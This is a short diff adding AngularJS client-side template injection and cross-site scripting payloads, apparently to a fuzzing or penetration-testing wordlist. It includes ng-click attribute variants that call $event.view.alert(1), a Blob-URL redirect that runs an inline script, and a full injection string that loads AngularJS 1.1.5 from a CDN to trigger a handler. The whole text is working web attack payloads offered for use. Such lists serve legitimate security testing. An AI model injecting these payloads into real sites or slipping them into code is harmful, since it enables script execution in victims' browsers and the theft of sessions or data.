@@ -1,0 +1,7 @@
+ng-click="$event.view.alert(1)
+x-ng-click="$event.view.alert(1)
+data-ng-click="$event.view.alert(1)
+_-_-_-ng_-_-_click="$event.view.alert(1)
+$event.view.location.replace($event.view.URL.createObjectURL($event.view.Reflect.construct( $event.view.Blob,[['<script>alert(1)</script>'],{type:'text/html'}])))
+"><script/src=//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js></script><h1/ng-click=$event.view.alert(1)//>CLICKME"
+
